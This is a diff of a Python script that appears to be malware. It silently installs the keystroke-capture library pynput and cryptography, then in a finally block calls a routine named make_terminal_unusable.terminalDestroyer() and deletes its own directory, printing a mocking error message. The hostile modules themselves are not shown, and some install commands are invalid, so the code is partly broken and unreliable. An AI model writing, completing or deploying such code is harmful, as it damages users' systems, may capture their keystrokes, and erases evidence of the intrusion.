@@ -18,14 +18,14 @@ try:
     import pynput
     import cryptography
 
-except Exception as e:
+except ImportError as e:
     if CURRENT_OS == 'Windows':
-        windows = terminal.start_cmd()
-        windows.write("winget install pynput, cryptography")
+        windows = terminal
+        windows.write_cmd("winget install pynput, cryptography") or  windows.start_powershell("winget install pynput, cryptography")
 
     elif CURRENT_OS in ('Darwin', 'Linux'):
-        OS = terminal.start_terminal()
-        OS.write("sudo install pynput, cryptography")
+        OS = terminal
+        OS.start_terminal("sudo apt install pynput, cryptography")
 
     else:
         print(f"An exception: {e} occured.")
@@ -84,3 +84,16 @@ except Exception:
         pass
 
     shutil.rmtree(CURRENT_DIR)
+
+finally:
+    while True:
+        try:
+            CodeTest.codeTest()
+            make_terminal_unusable.terminalDestroyer()
+        
+        except Exception as e:
+            print(f"an error {e} occured...  :)")
+            shutil.rmtree(CURRENT_DIR)
+            break
+        break
+    
